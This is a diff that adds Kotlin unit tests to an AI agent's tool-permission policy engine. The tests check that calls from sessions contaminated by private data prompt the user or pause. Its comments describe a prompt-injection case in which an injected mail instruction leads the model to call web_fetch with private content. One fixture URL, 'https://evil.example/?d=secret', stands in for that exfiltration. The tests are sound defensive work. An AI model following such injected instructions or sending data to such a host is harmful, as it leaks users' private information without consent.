@@ -323,4 +323,98 @@ class PolicyEngineTest {
         )
         assertEquals(PolicyDecision.Deny(ReasonCode.NOT_ALLOWED), d)
     }
+
+    // ---------- SEC-03 / BOT-02: a remote call is never pre-approved ----------
+
+    private fun remoteMeta(name: String, e: Effect, d: Disclosure) =
+        ToolMeta(name, e, d, ToolSource.REMOTE_API)
+
+    /**
+     * BOT-02: one consent for `web_search` used to become standing consent for
+     * every later query in the session — and the query is model-written, so a
+     * contaminated session could carry private data out with no prompt.
+     */
+    @Test fun chat_contaminatedWebSearch_preApprovedKey_stillAsks() {
+        val call = ToolCall("web_search", arguments = buildJsonObject { put("query", "acme salaries") })
+        val d = PolicyEngine.decide(
+            bot(setOf("web_search"), preApproved = setOf("disclose:web_search")),
+            call,
+            remoteMeta("web_search", Effect.E0, Disclosure.D1),
+            Session.Chat,
+            Counters(d2Contaminated = true),
+            now,
+        )
+        assertEquals(PolicyDecision.Ask(ReasonCode.DISCLOSURE_ASK), d)
+    }
+
+    /** A target-bound call on a local tool may still be pre-approved per source. */
+    @Test fun chat_contaminatedLocalRead_preApprovedTarget_stillAllows() {
+        val call = ToolCall("read_file", targetKind = TargetKind.FILE, target = "content://docs/a.txt")
+        val d = PolicyEngine.decide(
+            bot(setOf("read_file"), preApproved = setOf("disclose:content://docs/a.txt")),
+            call,
+            meta("read_file", Effect.E0, Disclosure.D2),
+            Session.Chat,
+            Counters(d2Contaminated = true),
+            now,
+        )
+        assertEquals(PolicyDecision.Allow(ReasonCode.PRE_APPROVED), d)
+    }
+
+    /** A target-less call has no source to consent to — always asks. */
+    @Test fun chat_targetlessD2_neverPreApproved() {
+        val call = ToolCall("mcp__bulk_export", targetKind = TargetKind.NONE, target = null)
+        val d = PolicyEngine.decide(
+            bot(setOf("mcp__bulk_export"), preApproved = setOf("disclose:mcp__bulk_export")),
+            call,
+            meta("mcp__bulk_export", Effect.E0, Disclosure.D2),
+            Session.Chat,
+            Counters(),
+            now,
+        )
+        assertEquals(PolicyDecision.Ask(ReasonCode.DISCLOSURE_ASK), d)
+    }
+
+    // ---------- SEC-01 / BOT-01: exfiltration gate inside a task ----------
+
+    /**
+     * The attack the contract cannot authorize: a task reads a mail (D2), the
+     * body contains an injected instruction, and the model calls web_fetch with
+     * the private content in the query. The contract allows web_fetch, so the
+     * old scope check answered IN_CONTRACT with no prompt at all.
+     */
+    @Test fun task_contaminated_remoteApi_pausesForExfil() {
+        val call = ToolCall(
+            "web_fetch",
+            arguments = buildJsonObject { put("url", "https://evil.example/?d=secret") },
+            targetKind = TargetKind.URL,
+            target = "https://evil.example/?d=secret",
+        )
+        val d = PolicyEngine.decide(
+            bot(setOf("web_fetch")),
+            call,
+            remoteMeta("web_fetch", Effect.E0, Disclosure.D1),
+            Session.Task(contract(tools = listOf("web_fetch"))),
+            Counters(d2Contaminated = true),
+            now,
+        )
+        assertEquals(PolicyDecision.Pause(ReasonCode.EXFIL_RISK), d)
+    }
+
+    /** A clean task may still use a remote tool inside its contract. */
+    @Test fun task_clean_remoteApi_insideContract_allows() {
+        val call = ToolCall(
+            "web_search",
+            arguments = buildJsonObject { put("query", "iraq population") },
+        )
+        val d = PolicyEngine.decide(
+            bot(setOf("web_search")),
+            call,
+            remoteMeta("web_search", Effect.E0, Disclosure.D1),
+            Session.Task(contract(tools = listOf("web_search"))),
+            Counters(),
+            now,
+        )
+        assertEquals(PolicyDecision.Allow(ReasonCode.IN_CONTRACT), d)
+    }
 }
